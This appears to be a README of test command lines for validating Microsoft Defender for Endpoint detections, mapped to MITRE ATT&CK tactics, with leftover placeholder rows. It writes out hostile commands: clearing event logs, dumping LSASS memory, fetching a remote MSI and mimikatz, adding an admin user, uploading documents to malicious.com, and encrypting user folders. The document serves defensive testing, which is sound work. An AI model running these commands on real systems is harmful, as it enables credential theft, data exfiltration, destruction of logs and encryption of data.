# Command lines for MDE

Below are some of the command lines that can be used to evaluate MDE (Microsoft defender for Endpoint).

| Name  | Command               |
|----------|---------------------------|
| Clean Windows Event logs | `wevtutil cl system` <br> `wevtutil cl application` <br> `wevtutil cl security`   |
| create a scheduled task | `schtasks /Create /F /SC MINUTE /MO 3 /ST 07:00 /TN CMDTestTask /TR "cmd /c date /T > C:\Windows\Temp\current_date.txt" `    |
| use of living off the land binary to run malicious code | `msiexec /q /i https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true `   |
| Encode Certutil and decode | `copy %windir%\system32\certutil.exe %temp%\tcm.tmp` <br> `%temp%\tcm.tmp -encode C:\Windows\System32\calc.exe %temp%\T1140_calc2.txt`<br> `%temp%\tcm.tmp -decode %temp%\T1140_calc2.txt %temp%\T1140_calc2_decoded.exe`   |
| Dump LSASS.exe memory using comsvcs.dll | `C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full`   |
| Network Protection Command and Control | `Invoke-WebRequest -URI https://commandcontrol.smartscreentestratings.com`   |
| command3 | Description of command3   |
| command3 | Description of command3   |
| command3 | Description of command3   |
| command3 | Description of command3   |
| command3 | Description of command3   |
| command3 | Description of command3   |
| command3 | Description of command3   |

## MITRE Related Commands

| Tactic             | Technique ID | Technique Name                     | Command Line Example                                                                 |
|--------------------|--------------|------------------------------------|--------------------------------------------------------------------------------------|
| Initial Access     | T1078        | Valid Accounts                     | `net user testuser Password123! /add` <br> `net localgroup administrators testuser /add` |
| Execution          | T1059        | Command and Scripting Interpreter  | `powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Write-Host 'Hello, World!'"` <br> `cmd.exe /c echo Hello, World!` |
| Persistence        | T1053        | Scheduled Task/Job                 | `schtasks /create /tn "TestTask" /tr "cmd.exe /c echo Hello World > C:\temp\test.txt" /sc daily /st 12:00` |
| Privilege Escalation | T1548      | Abuse Elevation Control Mechanism  | `Start-Process cmd -Verb runAs`                                                      |
| Defense Evasion    | T1112        | Modify Registry                    | `reg add HKEY_CURRENT_USER\Software\Test /v TestValue /t REG_SZ /d "Test Data"`       |
| Credential Access  | T1003        | OS Credential Dumping              | `Invoke-WebRequest -Uri "http://example.com/mimikatz.exe" -OutFile "C:\temp\mimikatz.exe"` |
| Discovery          | T1082        | System Information Discovery       | `systeminfo`                                                                         |
| Lateral Movement   | T1021        | Remote Services                    | `mstsc /v:192.168.1.10`                                                              |
| Collection         | T1119        | Automated Collection               | `copy C:\Users\*\Documents\*.docx C:\temp\collection\`                                |
| Exfiltration       | T1041        | Exfiltration Over C2 Channel       | `Invoke-WebRequest -Uri "http://malicious.com/upload" -Method Post -InFile "C:\temp\collection\*.docx"` |
| Impact             | T1486        | Data Encrypted for Impact          | `cipher /e /s:C:\Users\*`                                                            |






## References

1. [RedCanary](https://github.com/redcanaryco/invoke-atomicredteam/wiki/Installing-Invoke-AtomicRedTeam)
   
3. [jeffreyappel Blog](https://jeffreyappel.nl/microsoft-defender-for-endpoint-series-validate-defender-protection-and-additional-troubleshooting-part6/)
